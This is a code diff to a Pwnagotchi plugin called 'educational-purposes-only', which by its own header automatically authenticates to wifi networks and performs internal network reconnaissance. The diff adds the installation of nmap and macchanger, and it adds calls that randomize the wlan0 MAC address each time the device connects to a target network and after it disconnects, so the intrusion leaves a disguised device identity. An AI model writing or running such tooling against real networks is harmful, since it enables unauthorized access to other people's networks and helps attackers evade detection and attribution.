@@ -1,4 +1,5 @@
 # educational-purposes-only performs automatic wifi authentication and internal network recon
+# Install dependencies: apt update; apt install nmap macchanger
 from pwnagotchi.ui.components import LabeledValue
 from pwnagotchi.ui.view import BLACK
 import pwnagotchi.ui.fonts as fonts
@@ -18,8 +19,10 @@ class EducationalPurposesOnly(plugins.Plugin):
     def _connect_to_target_network(self, target_network, channel):
         # Send command to Bettercap to stop using mon0:
         requests.post('http://127.0.0.1:8081/api/session', data='{"cmd":"wifi.recon off"}', auth=('pwnagotchi', 'pwnagotchi'))
-        # Disable monitor mode interface mon0 (this method seems to be the most reliable?):
+        # Disable monitor mode interface mon0 (this seems to be the most reliable method?):
         os.popen('modprobe --remove brcmfmac && modprobe brcmfmac')
+        # Randomize wlan0 MAC address (-A means a random but real vendor string is used) prior to connecting:
+        os.popen('macchanger -A --bia wlan0')
         # Set wlan0 channel to match AP. Can be verified by running `iwlist channel`:
         os.popen("iwconfig wlan0 channel %d" % channel)
         # Update wpa_supplicant.conf file
@@ -35,6 +38,8 @@ class EducationalPurposesOnly(plugins.Plugin):
         os.popen('killall wpa_supplicant')
         # Restart potentially buggy driver:
         os.popen('modprobe --remove brcmfmac && modprobe brcmfmac')
+        # Randomize MAC address of wlan0 again:
+        os.popen('macchanger -A --bia wlan0')
         # Start monitor mode:
         os.popen('iw phy "$(iw phy | head -1 | cut -d" " -f2)" interface add mon0 type monitor && ifconfig mon0 up')
         # Send command to Bettercap to resume wifi recon (using mon0):
